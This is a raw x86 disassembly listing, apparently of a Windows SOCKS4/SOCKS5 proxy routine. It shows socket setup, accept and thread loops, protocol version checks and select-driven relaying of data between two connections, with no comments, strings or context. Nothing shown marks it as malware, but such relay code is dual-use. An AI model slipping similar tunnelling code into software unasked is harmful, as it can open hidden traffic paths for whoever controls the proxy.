131479e0:	ff 15 14 34 15 13    	call   *0x13153414
131479e6:	53                   	push   %ebx
131479e7:	ff 75 08             	pushl  0x8(%ebp)
131479ea:	e8 66 e2 ff ff       	call   0x13145c55
131479ef:	80 7d e1 01          	cmpb   $0x1,-0x1f(%ebp)
131479f3:	59                   	pop    %ecx
131479f4:	59                   	pop    %ecx
131479f5:	0f 85 ae 01 00 00    	jne    0x13147ba9
131479fb:	8d 45 f4             	lea    -0xc(%ebp),%eax
131479fe:	89 5d f4             	mov    %ebx,-0xc(%ebp)
13147a01:	50                   	push   %eax
13147a02:	56                   	push   %esi
13147a03:	ff 75 08             	pushl  0x8(%ebp)
13147a06:	ff 15 14 34 15 13    	call   *0x13153414
13147a0c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
13147a0f:	6a 04                	push   $0x4
13147a11:	50                   	push   %eax
13147a12:	8d 45 cc             	lea    -0x34(%ebp),%eax
13147a15:	50                   	push   %eax
13147a16:	66 c7 45 c8 02 00    	movw   $0x2,-0x38(%ebp)
13147a1c:	e8 2f ad ff ff       	call   0x13142750
13147a21:	66 8b 45 e2          	mov    -0x1e(%ebp),%ax
13147a25:	83 c4 0c             	add    $0xc,%esp
13147a28:	66 89 45 ca          	mov    %ax,-0x36(%ebp)
13147a2c:	53                   	push   %ebx
13147a2d:	57                   	push   %edi
13147a2e:	6a 02                	push   $0x2
13147a30:	ff 15 64 35 15 13    	call   *0x13153564
13147a36:	8d 4d c8             	lea    -0x38(%ebp),%ecx
13147a39:	6a 10                	push   $0x10
13147a3b:	51                   	push   %ecx
13147a3c:	50                   	push   %eax
13147a3d:	89 45 f8             	mov    %eax,-0x8(%ebp)
13147a40:	ff 15 34 37 15 13    	call   *0x13153734
13147a46:	83 f8 ff             	cmp    $0xffffffff,%eax
13147a49:	0f 84 5a 01 00 00    	je     0x13147ba9
13147a4f:	53                   	push   %ebx
13147a50:	8d 45 d8             	lea    -0x28(%ebp),%eax
13147a53:	6a 08                	push   $0x8
13147a55:	50                   	push   %eax
13147a56:	ff 75 08             	pushl  0x8(%ebp)
13147a59:	c6 45 d9 5a          	movb   $0x5a,-0x27(%ebp)
13147a5d:	88 5d d8             	mov    %bl,-0x28(%ebp)
13147a60:	ff 15 68 37 15 13    	call   *0x13153768
13147a66:	8d 45 f4             	lea    -0xc(%ebp),%eax
13147a69:	89 5d f4             	mov    %ebx,-0xc(%ebp)
13147a6c:	50                   	push   %eax
13147a6d:	56                   	push   %esi
13147a6e:	ff 75 f8             	pushl  -0x8(%ebp)
13147a71:	ff 15 14 34 15 13    	call   *0x13153414
13147a77:	8d 45 f4             	lea    -0xc(%ebp),%eax
13147a7a:	50                   	push   %eax
13147a7b:	56                   	push   %esi
13147a7c:	ff 75 08             	pushl  0x8(%ebp)
13147a7f:	ff 15 14 34 15 13    	call   *0x13153414
13147a85:	c7 45 e8 02 00 00 00 	movl   $0x2,-0x18(%ebp)
13147a8c:	39 1d e8 3e 16 13    	cmp    %ebx,0x13163ee8
13147a92:	0f 84 03 01 00 00    	je     0x13147b9b
13147a98:	8b 45 08             	mov    0x8(%ebp),%eax
13147a9b:	89 bd c4 fe ff ff    	mov    %edi,-0x13c(%ebp)
13147aa1:	89 85 c8 fe ff ff    	mov    %eax,-0x138(%ebp)
13147aa7:	33 c9                	xor    %ecx,%ecx
13147aa9:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
13147aaf:	8b 55 f8             	mov    -0x8(%ebp),%edx
13147ab2:	39 10                	cmp    %edx,(%eax)
13147ab4:	74 08                	je     0x13147abe
13147ab6:	41                   	inc    %ecx
13147ab7:	83 c0 04             	add    $0x4,%eax
13147aba:	3b cf                	cmp    %edi,%ecx
13147abc:	72 f1                	jb     0x13147aaf
13147abe:	3b cf                	cmp    %edi,%ecx
13147ac0:	75 0d                	jne    0x13147acf
13147ac2:	89 94 8d c8 fe ff ff 	mov    %edx,-0x138(%ebp,%ecx,4)
13147ac9:	ff 85 c4 fe ff ff    	incl   -0x13c(%ebp)
13147acf:	8d 45 e8             	lea    -0x18(%ebp),%eax
13147ad2:	50                   	push   %eax
13147ad3:	53                   	push   %ebx
13147ad4:	8d 85 c4 fe ff ff    	lea    -0x13c(%ebp),%eax
13147ada:	53                   	push   %ebx
13147adb:	50                   	push   %eax
13147adc:	53                   	push   %ebx
13147add:	ff 15 fc 33 15 13    	call   *0x131533fc
13147ae3:	85 c0                	test   %eax,%eax
13147ae5:	7e a5                	jle    0x13147a8c
13147ae7:	8d 85 c4 fe ff ff    	lea    -0x13c(%ebp),%eax
13147aed:	50                   	push   %eax
13147aee:	ff 75 08             	pushl  0x8(%ebp)
13147af1:	ff 15 ac 36 15 13    	call   *0x131536ac
13147af7:	85 c0                	test   %eax,%eax
13147af9:	74 45                	je     0x13147b40
13147afb:	6a 02                	push   $0x2
13147afd:	bf e0 3d 15 13       	mov    $0x13153de0,%edi
13147b02:	68 00 00 01 00       	push   $0x10000
13147b07:	57                   	push   %edi
13147b08:	ff 75 08             	pushl  0x8(%ebp)
13147b0b:	ff 15 4c 37 15 13    	call   *0x1315374c
13147b11:	85 c0                	test   %eax,%eax
13147b13:	0f 84 82 00 00 00    	je     0x13147b9b
13147b19:	53                   	push   %ebx
13147b1a:	68 00 00 01 00       	push   $0x10000
13147b1f:	57                   	push   %edi
13147b20:	ff 75 08             	pushl  0x8(%ebp)
13147b23:	ff 15 4c 37 15 13    	call   *0x1315374c
13147b29:	83 f8 ff             	cmp    $0xffffffff,%eax
13147b2c:	74 6d                	je     0x13147b9b
13147b2e:	3b c3                	cmp    %ebx,%eax
13147b30:	7e 69                	jle    0x13147b9b
13147b32:	53                   	push   %ebx
13147b33:	50                   	push   %eax
13147b34:	57                   	push   %edi
13147b35:	ff 75 f8             	pushl  -0x8(%ebp)
13147b38:	ff 15 68 37 15 13    	call   *0x13153768
13147b3e:	eb 05                	jmp    0x13147b45
13147b40:	bf e0 3d 15 13       	mov    $0x13153de0,%edi
13147b45:	8d 85 c4 fe ff ff    	lea    -0x13c(%ebp),%eax
13147b4b:	50                   	push   %eax
13147b4c:	ff 75 f8             	pushl  -0x8(%ebp)
13147b4f:	ff 15 ac 36 15 13    	call   *0x131536ac
13147b55:	85 c0                	test   %eax,%eax
13147b57:	74 3a                	je     0x13147b93
13147b59:	6a 02                	push   $0x2
13147b5b:	68 00 00 01 00       	push   $0x10000
13147b60:	57                   	push   %edi
13147b61:	ff 75 f8             	pushl  -0x8(%ebp)
13147b64:	ff 15 4c 37 15 13    	call   *0x1315374c
13147b6a:	85 c0                	test   %eax,%eax
13147b6c:	74 2d                	je     0x13147b9b
13147b6e:	53                   	push   %ebx
13147b6f:	68 00 00 01 00       	push   $0x10000
13147b74:	57                   	push   %edi
13147b75:	ff 75 f8             	pushl  -0x8(%ebp)
13147b78:	ff 15 4c 37 15 13    	call   *0x1315374c
13147b7e:	83 f8 ff             	cmp    $0xffffffff,%eax
13147b81:	74 18                	je     0x13147b9b
13147b83:	3b c3                	cmp    %ebx,%eax
13147b85:	7e 14                	jle    0x13147b9b
13147b87:	53                   	push   %ebx
13147b88:	50                   	push   %eax
13147b89:	57                   	push   %edi
13147b8a:	ff 75 08             	pushl  0x8(%ebp)
13147b8d:	ff 15 68 37 15 13    	call   *0x13153768
13147b93:	6a 01                	push   $0x1
13147b95:	5f                   	pop    %edi
13147b96:	e9 f1 fe ff ff       	jmp    0x13147a8c
13147b9b:	8b 45 f0             	mov    -0x10(%ebp),%eax
13147b9e:	ff 45 f0             	incl   -0x10(%ebp)
13147ba1:	85 c0                	test   %eax,%eax
13147ba3:	0f 84 83 fd ff ff    	je     0x1314792c
13147ba9:	39 5d 08             	cmp    %ebx,0x8(%ebp)
13147bac:	74 09                	je     0x13147bb7
13147bae:	ff 75 08             	pushl  0x8(%ebp)
13147bb1:	ff 15 e4 36 15 13    	call   *0x131536e4
13147bb7:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
13147bba:	5f                   	pop    %edi
13147bbb:	5e                   	pop    %esi
13147bbc:	5b                   	pop    %ebx
13147bbd:	74 09                	je     0x13147bc8
13147bbf:	ff 75 f8             	pushl  -0x8(%ebp)
13147bc2:	ff 15 e4 36 15 13    	call   *0x131536e4
13147bc8:	33 c0                	xor    %eax,%eax
13147bca:	c9                   	leave  
13147bcb:	c2 04 00             	ret    $0x4
13147bce:	55                   	push   %ebp
13147bcf:	8b ec                	mov    %esp,%ebp
13147bd1:	81 ec 18 06 00 00    	sub    $0x618,%esp
13147bd7:	53                   	push   %ebx
13147bd8:	56                   	push   %esi
13147bd9:	57                   	push   %edi
13147bda:	68 e4 3d 16 13       	push   $0x13163de4
13147bdf:	8d 85 e8 fa ff ff    	lea    -0x518(%ebp),%eax
13147be5:	68 00 d1 14 13       	push   $0x1314d100
13147bea:	50                   	push   %eax
13147beb:	ff 15 98 39 15 13    	call   *0x13153998
13147bf1:	83 c4 0c             	add    $0xc,%esp
13147bf4:	6a 06                	push   $0x6
13147bf6:	6a 01                	push   $0x1
13147bf8:	6a 02                	push   $0x2
13147bfa:	ff 15 64 35 15 13    	call   *0x13153564
13147c00:	83 f8 ff             	cmp    $0xffffffff,%eax
13147c03:	a3 e4 3e 16 13       	mov    %eax,0x13163ee4
13147c08:	75 1e                	jne    0x13147c28
13147c0a:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
13147c10:	33 db                	xor    %ebx,%ebx
13147c12:	68 74 0a 15 13       	push   $0x13150a74
13147c17:	50                   	push   %eax
13147c18:	89 1d e8 3e 16 13    	mov    %ebx,0x13163ee8
13147c1e:	ff 15 98 39 15 13    	call   *0x13153998
13147c24:	59                   	pop    %ecx
13147c25:	59                   	pop    %ecx
13147c26:	eb 60                	jmp    0x13147c88
13147c28:	66 a1 e0 3d 16 13    	mov    0x13163de0,%ax
13147c2e:	66 c7 45 f0 02 00    	movw   $0x2,-0x10(%ebp)
13147c34:	50                   	push   %eax
13147c35:	ff 15 8c 37 15 13    	call   *0x1315378c
13147c3b:	66 89 45 f2          	mov    %ax,-0xe(%ebp)
13147c3f:	8d 45 f0             	lea    -0x10(%ebp),%eax
13147c42:	6a 10                	push   $0x10
13147c44:	50                   	push   %eax
13147c45:	ff 35 e4 3e 16 13    	pushl  0x13163ee4
13147c4b:	33 db                	xor    %ebx,%ebx
13147c4d:	89 5d f4             	mov    %ebx,-0xc(%ebp)
13147c50:	ff 15 5c 37 15 13    	call   *0x1315375c
13147c56:	83 f8 ff             	cmp    $0xffffffff,%eax
13147c59:	75 5d                	jne    0x13147cb8
13147c5b:	ff 35 e4 3e 16 13    	pushl  0x13163ee4
13147c61:	89 1d e8 3e 16 13    	mov    %ebx,0x13163ee8
13147c67:	ff 15 e4 36 15 13    	call   *0x131536e4
13147c6d:	ff 35 e0 3d 16 13    	pushl  0x13163de0
13147c73:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
13147c79:	68 44 0a 15 13       	push   $0x13150a44
13147c7e:	50                   	push   %eax
13147c7f:	ff 15 98 39 15 13    	call   *0x13153998
13147c85:	83 c4 0c             	add    $0xc,%esp
13147c88:	39 1d f0 3e 16 13    	cmp    %ebx,0x13163ef0
13147c8e:	75 3e                	jne    0x13147cce
13147c90:	ff 35 f4 3e 16 13    	pushl  0x13163ef4
13147c96:	b9 81 01 00 00       	mov    $0x181,%ecx
13147c9b:	8d b5 e8 f9 ff ff    	lea    -0x618(%ebp),%esi
13147ca1:	81 ec 04 06 00 00    	sub    $0x604,%esp
13147ca7:	8b fc                	mov    %esp,%edi
13147ca9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13147cab:	e8 3c 0e 00 00       	call   0x13148aec
13147cb0:	81 c4 08 06 00 00    	add    $0x608,%esp
13147cb6:	eb 16                	jmp    0x13147cce
13147cb8:	68 ff 00 00 00       	push   $0xff
13147cbd:	ff 35 e4 3e 16 13    	pushl  0x13163ee4
13147cc3:	ff 15 00 34 15 13    	call   *0x13153400
13147cc9:	83 f8 ff             	cmp    $0xffffffff,%eax
13147ccc:	75 04                	jne    0x13147cd2
13147cce:	33 c0                	xor    %eax,%eax
13147cd0:	eb 7f                	jmp    0x13147d51
13147cd2:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
13147cd8:	68 34 0a 15 13       	push   $0x13150a34
13147cdd:	50                   	push   %eax
13147cde:	ff 15 98 39 15 13    	call   *0x13153998
13147ce4:	39 1d f0 3e 16 13    	cmp    %ebx,0x13163ef0
13147cea:	59                   	pop    %ecx
13147ceb:	59                   	pop    %ecx
13147cec:	75 26                	jne    0x13147d14
13147cee:	ff 35 f4 3e 16 13    	pushl  0x13163ef4
13147cf4:	b9 81 01 00 00       	mov    $0x181,%ecx
13147cf9:	8d b5 e8 f9 ff ff    	lea    -0x618(%ebp),%esi
13147cff:	81 ec 04 06 00 00    	sub    $0x604,%esp
13147d05:	8b fc                	mov    %esp,%edi
13147d07:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13147d09:	e8 de 0d 00 00       	call   0x13148aec
13147d0e:	81 c4 08 06 00 00    	add    $0x608,%esp
13147d14:	ff 35 e0 3d 16 13    	pushl  0x13163de0
13147d1a:	6a 01                	push   $0x1
13147d1c:	e8 f1 00 00 00       	call   0x13147e12
13147d21:	59                   	pop    %ecx
13147d22:	59                   	pop    %ecx
13147d23:	39 1d e8 3e 16 13    	cmp    %ebx,0x13163ee8
13147d29:	74 23                	je     0x13147d4e
13147d2b:	8d 45 ec             	lea    -0x14(%ebp),%eax
13147d2e:	50                   	push   %eax
13147d2f:	53                   	push   %ebx
13147d30:	53                   	push   %ebx
13147d31:	53                   	push   %ebx
13147d32:	ff 35 e4 3e 16 13    	pushl  0x13163ee4
13147d38:	ff 15 3c 37 15 13    	call   *0x1315373c
13147d3e:	50                   	push   %eax
13147d3f:	68 0f 79 14 13       	push   $0x1314790f
13147d44:	53                   	push   %ebx
13147d45:	53                   	push   %ebx
13147d46:	ff 15 30 37 15 13    	call   *0x13153730
13147d4c:	eb d5                	jmp    0x13147d23
13147d4e:	6a 01                	push   $0x1
13147d50:	58                   	pop    %eax
13147d51:	5f                   	pop    %edi
13147d52:	5e                   	pop    %esi
13147d53:	5b                   	pop    %ebx
13147d54:	c9                   	leave  
13147d55:	c2 04 00             	ret    $0x4
13147d58:	55                   	push   %ebp
13147d59:	8b ec                	mov    %esp,%ebp
13147d5b:	ff 75 0c             	pushl  0xc(%ebp)
13147d5e:	68 00 d1 14 13       	push   $0x1314d100
13147d63:	68 e4 3d 16 13       	push   $0x13163de4
13147d68:	ff 15 98 39 15 13    	call   *0x13153998
13147d6e:	33 c0                	xor    %eax,%eax
13147d70:	83 c4 0c             	add    $0xc,%esp
13147d73:	39 05 e8 3e 16 13    	cmp    %eax,0x13163ee8
13147d79:	74 04                	je     0x13147d7f
13147d7b:	6a 02                	push   $0x2
13147d7d:	eb 42                	jmp    0x13147dc1
13147d7f:	8b 0d 44 45 17 13    	mov    0x13174544,%ecx
13147d85:	c7 05 e8 3e 16 13 01 	movl   $0x1,0x13163ee8
13147d8c:	00 00 00 
13147d8f:	89 0d f0 3e 16 13    	mov    %ecx,0x13163ef0
13147d95:	8b 4d 08             	mov    0x8(%ebp),%ecx
13147d98:	89 0d e0 3d 16 13    	mov    %ecx,0x13163de0
13147d9e:	8b 4d 10             	mov    0x10(%ebp),%ecx
13147da1:	89 0d f4 3e 16 13    	mov    %ecx,0x13163ef4
13147da7:	8d 4d 0c             	lea    0xc(%ebp),%ecx
13147daa:	51                   	push   %ecx
13147dab:	50                   	push   %eax
13147dac:	50                   	push   %eax
13147dad:	68 ce 7b 14 13       	push   $0x13147bce
13147db2:	50                   	push   %eax
13147db3:	50                   	push   %eax
13147db4:	ff 15 30 37 15 13    	call   *0x13153730
13147dba:	a3 ec 3e 16 13       	mov    %eax,0x13163eec
13147dbf:	6a 01                	push   $0x1
13147dc1:	58                   	pop    %eax
13147dc2:	5d                   	pop    %ebp
13147dc3:	c3                   	ret    
13147dc4:	56                   	push   %esi
13147dc5:	33 f6                	xor    %esi,%esi
13147dc7:	39 35 e8 3e 16 13    	cmp    %esi,0x13163ee8
13147dcd:	75 04                	jne    0x13147dd3
13147dcf:	6a 02                	push   $0x2
13147dd1:	eb 30                	jmp    0x13147e03
13147dd3:	ff 35 e4 3e 16 13    	pushl  0x13163ee4
13147dd9:	89 35 e8 3e 16 13    	mov    %esi,0x13163ee8
13147ddf:	ff 15 e4 36 15 13    	call   *0x131536e4
13147de5:	56                   	push   %esi
13147de6:	ff 35 ec 3e 16 13    	pushl  0x13163eec
13147dec:	ff 15 d8 36 15 13    	call   *0x131536d8
13147df2:	39 74 24 08          	cmp    %esi,0x8(%esp)
13147df6:	74 09                	je     0x13147e01
13147df8:	56                   	push   %esi
13147df9:	56                   	push   %esi
13147dfa:	e8 13 00 00 00       	call   0x13147e12
13147dff:	59                   	pop    %ecx
13147e00:	59                   	pop    %ecx
13147e01:	6a 01                	push   $0x1
13147e03:	58                   	pop    %eax
13147e04:	5e                   	pop    %esi
13147e05:	c3                   	ret    
13147e06:	a1 e8 3e 16 13       	mov    0x13163ee8,%eax
13147e0b:	c3                   	ret    
13147e0c:	a1 e0 3d 16 13       	mov    0x13163de0,%eax
13147e11:	c3                   	ret    
13147e12:	8d 44 24 04          	lea    0x4(%esp),%eax
13147e16:	6a 04                	push   $0x4
13147e18:	50                   	push   %eax
13147e19:	68 a4 0a 15 13       	push   $0x13150aa4
13147e1e:	e8 e8 f0 ff ff       	call   0x13146f0b
13147e23:	83 c4 0c             	add    $0xc,%esp
13147e26:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
13147e2b:	74 14                	je     0x13147e41
13147e2d:	8d 44 24 08          	lea    0x8(%esp),%eax
13147e31:	6a 04                	push   $0x4
13147e33:	50                   	push   %eax
13147e34:	68 98 0a 15 13       	push   $0x13150a98
13147e39:	e8 cd f0 ff ff       	call   0x13146f0b
13147e3e:	83 c4 0c             	add    $0xc,%esp
13147e41:	6a 01                	push   $0x1
13147e43:	58                   	pop    %eax
13147e44:	c3                   	ret    
13147e45:	55                   	push   %ebp
13147e46:	8b ec                	mov    %esp,%ebp
13147e48:	81 ec 3c 02 00 00    	sub    $0x23c,%esp
13147e4e:	53                   	push   %ebx
13147e4f:	56                   	push   %esi
13147e50:	8b 75 08             	mov    0x8(%ebp),%esi
13147e53:	57                   	push   %edi
13147e54:	6a 01                	push   $0x1
13147e56:	33 db                	xor    %ebx,%ebx
13147e58:	59                   	pop    %ecx
13147e59:	89 5d f8             	mov    %ebx,-0x8(%ebp)
13147e5c:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
13147e5f:	eb 03                	jmp    0x13147e64
13147e61:	6a 01                	push   $0x1
13147e63:	59                   	pop    %ecx
13147e64:	39 1d 00 40 16 13    	cmp    %ebx,0x13164000
13147e6a:	0f 84 bd 02 00 00    	je     0x1314812d
13147e70:	33 c0                	xor    %eax,%eax
13147e72:	8d 7d ce             	lea    -0x32(%ebp),%edi
13147e75:	66 89 5d cc          	mov    %bx,-0x34(%ebp)
13147e79:	89 4d f4             	mov    %ecx,-0xc(%ebp)
13147e7c:	ab                   	stos   %eax,%es:(%edi)
13147e7d:	ab                   	stos   %eax,%es:(%edi)
13147e7e:	ab                   	stos   %eax,%es:(%edi)
13147e7f:	66 ab                	stos   %ax,%es:(%edi)
13147e81:	33 c0                	xor    %eax,%eax
13147e83:	8d 7d e0             	lea    -0x20(%ebp),%edi
13147e86:	ab                   	stos   %eax,%es:(%edi)
13147e87:	8d 45 dc             	lea    -0x24(%ebp),%eax
13147e8a:	89 b5 cc fe ff ff    	mov    %esi,-0x134(%ebp)
13147e90:	50                   	push   %eax
13147e91:	53                   	push   %ebx
13147e92:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
13147e98:	53                   	push   %ebx
13147e99:	50                   	push   %eax
13147e9a:	53                   	push   %ebx
13147e9b:	89 8d c8 fe ff ff    	mov    %ecx,-0x138(%ebp)
13147ea1:	c7 45 dc 1e 00 00 00 	movl   $0x1e,-0x24(%ebp)
13147ea8:	88 5d 0b             	mov    %bl,0xb(%ebp)
13147eab:	ff 15 fc 33 15 13    	call   *0x131533fc
13147eb1:	83 f8 ff             	cmp    $0xffffffff,%eax
13147eb4:	0f 84 73 02 00 00    	je     0x1314812d
13147eba:	3b c3                	cmp    %ebx,%eax
13147ebc:	0f 84 6b 02 00 00    	je     0x1314812d
13147ec2:	8d 45 f4             	lea    -0xc(%ebp),%eax
13147ec5:	89 5d f4             	mov    %ebx,-0xc(%ebp)
13147ec8:	50                   	push   %eax
13147ec9:	68 7e 66 04 80       	push   $0x8004667e
13147ece:	56                   	push   %esi
13147ecf:	ff 15 14 34 15 13    	call   *0x13153414
13147ed5:	6a 02                	push   $0x2
13147ed7:	8d 45 0b             	lea    0xb(%ebp),%eax
13147eda:	6a 01                	push   $0x1
13147edc:	50                   	push   %eax
13147edd:	56                   	push   %esi
13147ede:	ff 15 4c 37 15 13    	call   *0x1315374c
13147ee4:	80 7d 0b 05          	cmpb   $0x5,0xb(%ebp)
13147ee8:	0f 85 3f 02 00 00    	jne    0x1314812d
13147eee:	6a 40                	push   $0x40
13147ef0:	33 c0                	xor    %eax,%eax
13147ef2:	59                   	pop    %ecx
13147ef3:	8d bd c5 fd ff ff    	lea    -0x23b(%ebp),%edi
13147ef9:	88 9d c4 fd ff ff    	mov    %bl,-0x23c(%ebp)
13147eff:	88 5d fe             	mov    %bl,-0x2(%ebp)
13147f02:	f3 ab                	rep stos %eax,%es:(%edi)
13147f04:	8d 7d ff             	lea    -0x1(%ebp),%edi
13147f07:	88 5d e8             	mov    %bl,-0x18(%ebp)
13147f0a:	aa                   	stos   %al,%es:(%edi)
13147f0b:	8d 7d e9             	lea    -0x17(%ebp),%edi
13147f0e:	53                   	push   %ebx
13147f0f:	ab                   	stos   %eax,%es:(%edi)
13147f10:	ab                   	stos   %eax,%es:(%edi)
13147f11:	66 ab                	stos   %ax,%es:(%edi)
13147f13:	aa                   	stos   %al,%es:(%edi)
13147f14:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
13147f1a:	6a 01                	push   $0x1
13147f1c:	50                   	push   %eax
13147f1d:	56                   	push   %esi
13147f1e:	ff 15 4c 37 15 13    	call   *0x1315374c
13147f24:	53                   	push   %ebx
13147f25:	8d 85 c5 fd ff ff    	lea    -0x23b(%ebp),%eax
13147f2b:	6a 01                	push   $0x1
13147f2d:	50                   	push   %eax
13147f2e:	56                   	push   %esi
13147f2f:	ff 15 4c 37 15 13    	call   *0x1315374c
13147f35:	0f b6 85 c5 fd ff ff 	movzbl -0x23b(%ebp),%eax
13147f3c:	53                   	push   %ebx
13147f3d:	50                   	push   %eax
13147f3e:	8d 85 c5 fd ff ff    	lea    -0x23b(%ebp),%eax
13147f44:	50                   	push   %eax
13147f45:	56                   	push   %esi
13147f46:	ff 15 4c 37 15 13    	call   *0x1315374c
13147f4c:	53                   	push   %ebx
13147f4d:	8d 45 fe             	lea    -0x2(%ebp),%eax
13147f50:	6a 02                	push   $0x2
13147f52:	50                   	push   %eax
13147f53:	56                   	push   %esi
13147f54:	c6 45 fe 05          	movb   $0x5,-0x2(%ebp)
13147f58:	88 5d ff             	mov    %bl,-0x1(%ebp)
13147f5b:	ff 15 68 37 15 13    	call   *0x13153768
13147f61:	53                   	push   %ebx
13147f62:	6a 0c                	push   $0xc
13147f64:	5f                   	pop    %edi
13147f65:	8d 45 e8             	lea    -0x18(%ebp),%eax
13147f68:	57                   	push   %edi
13147f69:	50                   	push   %eax
13147f6a:	56                   	push   %esi
13147f6b:	ff 15 4c 37 15 13    	call   *0x1315374c
13147f71:	80 7d eb 01          	cmpb   $0x1,-0x15(%ebp)
13147f75:	0f 85 9b 01 00 00    	jne    0x13148116
13147f7b:	80 7d e9 01          	cmpb   $0x1,-0x17(%ebp)
13147f7f:	0f 85 a8 01 00 00    	jne    0x1314812d
13147f85:	8d 45 ec             	lea    -0x14(%ebp),%eax
13147f88:	6a 04                	push   $0x4
13147f8a:	50                   	push   %eax
13147f8b:	8d 45 d0             	lea    -0x30(%ebp),%eax
13147f8e:	50                   	push   %eax
13147f8f:	66 c7 45 cc 02 00    	movw   $0x2,-0x34(%ebp)
13147f95:	e8 b6 a7 ff ff       	call   0x13142750
13147f9a:	66 8b 45 f0          	mov    -0x10(%ebp),%ax
13147f9e:	83 c4 0c             	add    $0xc,%esp
13147fa1:	66 89 45 ce          	mov    %ax,-0x32(%ebp)
13147fa5:	53                   	push   %ebx
13147fa6:	6a 01                	push   $0x1
13147fa8:	6a 02                	push   $0x2
13147faa:	ff 15 64 35 15 13    	call   *0x13153564
13147fb0:	8d 4d cc             	lea    -0x34(%ebp),%ecx
13147fb3:	6a 10                	push   $0x10
13147fb5:	51                   	push   %ecx
13147fb6:	50                   	push   %eax
13147fb7:	89 45 f8             	mov    %eax,-0x8(%ebp)
13147fba:	ff 15 34 37 15 13    	call   *0x13153734
13147fc0:	83 f8 ff             	cmp    $0xffffffff,%eax
13147fc3:	0f 84 53 01 00 00    	je     0x1314811c
13147fc9:	53                   	push   %ebx
13147fca:	8d 45 e8             	lea    -0x18(%ebp),%eax
13147fcd:	57                   	push   %edi
13147fce:	50                   	push   %eax
13147fcf:	56                   	push   %esi
13147fd0:	88 5d e9             	mov    %bl,-0x17(%ebp)
13147fd3:	ff 15 68 37 15 13    	call   *0x13153768
13147fd9:	8d 45 f4             	lea    -0xc(%ebp),%eax
13147fdc:	bf 7e 66 04 80       	mov    $0x8004667e,%edi
13147fe1:	50                   	push   %eax
13147fe2:	57                   	push   %edi
13147fe3:	ff 75 f8             	pushl  -0x8(%ebp)
13147fe6:	89 5d f4             	mov    %ebx,-0xc(%ebp)
13147fe9:	ff 15 14 34 15 13    	call   *0x13153414
13147fef:	8d 45 f4             	lea    -0xc(%ebp),%eax
13147ff2:	50                   	push   %eax
13147ff3:	57                   	push   %edi
13147ff4:	56                   	push   %esi
13147ff5:	ff 15 14 34 15 13    	call   *0x13153414
13147ffb:	c7 45 dc 02 00 00 00 	movl   $0x2,-0x24(%ebp)
13148002:	39 1d 00 40 16 13    	cmp    %ebx,0x13164000
13148008:	0f 84 f8 00 00 00    	je     0x13148106
1314800e:	6a 01                	push   $0x1
13148010:	89 b5 cc fe ff ff    	mov    %esi,-0x134(%ebp)
13148016:	5a                   	pop    %edx
13148017:	33 c9                	xor    %ecx,%ecx
13148019:	89 95 c8 fe ff ff    	mov    %edx,-0x138(%ebp)
1314801f:	8d 85 cc fe ff ff    	lea    -0x134(%ebp),%eax
13148025:	8b 7d f8             	mov    -0x8(%ebp),%edi
13148028:	39 38                	cmp    %edi,(%eax)
1314802a:	74 08                	je     0x13148034
1314802c:	41                   	inc    %ecx
1314802d:	83 c0 04             	add    $0x4,%eax
13148030:	3b ca                	cmp    %edx,%ecx
13148032:	72 f1                	jb     0x13148025
13148034:	3b ca                	cmp    %edx,%ecx
13148036:	75 0d                	jne    0x13148045
13148038:	89 bc 8d cc fe ff ff 	mov    %edi,-0x134(%ebp,%ecx,4)
1314803f:	ff 85 c8 fe ff ff    	incl   -0x138(%ebp)
13148045:	8d 45 dc             	lea    -0x24(%ebp),%eax
13148048:	50                   	push   %eax
13148049:	53                   	push   %ebx
1314804a:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
13148050:	53                   	push   %ebx
13148051:	50                   	push   %eax
13148052:	53                   	push   %ebx
13148053:	ff 15 fc 33 15 13    	call   *0x131533fc
13148059:	85 c0                	test   %eax,%eax
1314805b:	7e a5                	jle    0x13148002
1314805d:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
13148063:	50                   	push   %eax
13148064:	56                   	push   %esi
13148065:	ff 15 ac 36 15 13    	call   *0x131536ac
1314806b:	85 c0                	test   %eax,%eax
1314806d:	74 3d                	je     0x131480ac
1314806f:	6a 02                	push   $0x2
13148071:	bf 10 40 16 13       	mov    $0x13164010,%edi
13148076:	68 00 00 01 00       	push   $0x10000
1314807b:	57                   	push   %edi
1314807c:	56                   	push   %esi
1314807d:	ff 15 4c 37 15 13    	call   *0x1315374c
13148083:	85 c0                	test   %eax,%eax
13148085:	74 7f                	je     0x13148106
13148087:	53                   	push   %ebx
13148088:	68 00 00 01 00       	push   $0x10000
1314808d:	57                   	push   %edi
1314808e:	56                   	push   %esi
1314808f:	ff 15 4c 37 15 13    	call   *0x1315374c
13148095:	83 f8 ff             	cmp    $0xffffffff,%eax
13148098:	74 6c                	je     0x13148106
1314809a:	3b c3                	cmp    %ebx,%eax
1314809c:	7e 68                	jle    0x13148106
1314809e:	53                   	push   %ebx
1314809f:	50                   	push   %eax
131480a0:	57                   	push   %edi
131480a1:	ff 75 f8             	pushl  -0x8(%ebp)
131480a4:	ff 15 68 37 15 13    	call   *0x13153768
131480aa:	eb 05                	jmp    0x131480b1
131480ac:	bf 10 40 16 13       	mov    $0x13164010,%edi
131480b1:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
131480b7:	50                   	push   %eax
131480b8:	ff 75 f8             	pushl  -0x8(%ebp)
131480bb:	ff 15 ac 36 15 13    	call   *0x131536ac
131480c1:	85 c0                	test   %eax,%eax
131480c3:	0f 84 39 ff ff ff    	je     0x13148002
131480c9:	6a 02                	push   $0x2
131480cb:	68 00 00 01 00       	push   $0x10000
131480d0:	57                   	push   %edi
131480d1:	ff 75 f8             	pushl  -0x8(%ebp)
131480d4:	ff 15 4c 37 15 13    	call   *0x1315374c
131480da:	85 c0                	test   %eax,%eax
131480dc:	74 28                	je     0x13148106
131480de:	53                   	push   %ebx
